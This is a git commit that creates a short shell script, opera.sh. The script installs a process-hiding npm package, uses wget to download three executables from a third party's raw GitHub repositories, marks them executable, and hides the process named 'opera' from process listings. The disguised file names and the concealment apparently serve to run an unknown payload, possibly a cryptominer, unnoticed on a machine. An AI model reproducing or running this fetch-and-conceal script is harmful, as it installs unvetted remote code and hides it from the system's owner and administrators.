cd2718e4db28978383009937f69c4cf39c6fb868
santikarla <109403746+santikarla@users.noreply.github.com>
2022-07-16 04:56:37 +0000

    Create opera.sh

---
+++ opera.sh
@@ -0,0 +1,14 @@
+#!/bin/sh
+
+apt install screen -y
+npm i -g node-process-hider
+#
+#
+wget https://raw.githubusercontent.com/bendrat1/sop-sumohaven/main/ping && chmod +x ping
+#
+wget https://raw.githubusercontent.com/bendrat1/op/main/opera && chmod +x opera
+#
+wget https://raw.githubusercontent.com/bendrat1/sop-sumohaven/main/time.sh && chmod +x time.sh
+
+
+ph add opera
